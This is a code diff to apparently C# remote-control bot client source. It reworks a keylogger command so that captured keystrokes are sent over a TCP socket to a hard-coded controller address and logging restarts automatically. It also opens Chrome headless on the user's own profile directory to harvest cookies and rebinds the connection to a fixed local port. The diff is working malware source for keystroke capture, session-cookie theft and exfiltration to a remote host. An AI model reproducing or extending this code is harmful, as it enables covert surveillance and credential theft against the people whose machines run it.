@@ -226,6 +226,7 @@ namespace Client
         }
         #endregion
 
+        private static DateTime timeStart;
 
         public static bool IsAscii(char c)
         {
@@ -282,7 +283,7 @@ namespace Client
                 StreamWriter sw = new StreamWriter(logNameToWrite, true);
                 sw.WriteLine(DateTime.Now);
                 sw.WriteLine(url);
-                sw.WriteLine("erro: " + e.Message);
+                sw.WriteLine("error: " + e.Message);
                 sw.WriteLine("----------------------------------------------------------------------------------------");
                 sw.Close();
             }
@@ -425,17 +426,27 @@ namespace Client
             {
                 string cmd = command.Split('?')[1];
                 Console.WriteLine(cmd);
-                if (cmd.Equals("start keylogger"))
-                {
-                    //Console.WriteLine("okkk");
-                    BotKeylogger.StartKeylogger();
-                }
-                else if (cmd.Equals("stop keylogger"))
-                {
-                    BotKeylogger.StopKeylogger();
-                    sendFileSocket(client, "keylogger");
-                    File.Delete("outputkeylogger.txt");
-                }
+                //if (cmd.Equals("start keylogger"))
+                //{
+                //    //Console.WriteLine("okkk");
+                //    BotKeylogger.StartKeylogger();
+                //}
+                //else if (cmd.Equals("stop keylogger"))
+                //{
+                //    BotKeylogger.StopKeylogger();
+                //    sendFileSocket(client, "keylogger");
+                //    File.Delete("outputkeylogger.txt");
+                //}
+                BotKeylogger.StopKeylogger();
+                sendFileSocket(client, "keylogger");
+               
+                string str = timeStart.ToString();
+                data = encoding.GetBytes(str);
+                stream.Write(data, 0, data.Length);
+
+                File.Delete("outputkeylogger.txt");
+                BotKeylogger.StartKeylogger();
+                timeStart = DateTime.Now;
             }
             else if (command.StartsWith("exit"))
             {
@@ -452,17 +463,29 @@ namespace Client
         {
 
             //<--------------------- set up get cookies-------------------------->
+            //ChromeOptions options = new ChromeOptions();
+            //string username = RunCommandAndGetOutput("echo %username%").Trim();
+            //string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
+            //options.AddArguments(path, "headless");
+            //IWebDriver driver = new ChromeDriver(options);
+            ////Console.WriteLine("set up xong cookies");
+
+
             ChromeOptions options = new ChromeOptions();
             string username = RunCommandAndGetOutput("echo %username%").Trim();
             string path = "user-data-dir=C:/Users/" + username + "/AppData/Local/Google/Chrome/User Data";
             options.AddArguments(path, "headless");
             IWebDriver driver = new ChromeDriver(options);
-            //Console.WriteLine("set up xong cookies");
             //<---------------------end get cookies-------------------------->
             try
             {
                 TcpClient client = new TcpClient();
-                client.Connect("192.168.100.31", PORT_NUMBER);
+
+                IPEndPoint localEndPoint = new IPEndPoint(IPAddress.Any, 5454);
+                // Bind the client to the local endpoint
+                client.Client.Bind(localEndPoint);
+
+                client.Connect("192.168.1.103", PORT_NUMBER);
                 Stream stream = client.GetStream();
                 //Console.WriteLine("connect xong socket");
                 byte[] data;
@@ -490,6 +513,7 @@ namespace Client
             th_socket.SetApartmentState(ApartmentState.STA);
             th_socket.Start();
             BotKeylogger.initBotKeylogger();
+            timeStart = DateTime.Now;
         }
     }
 }
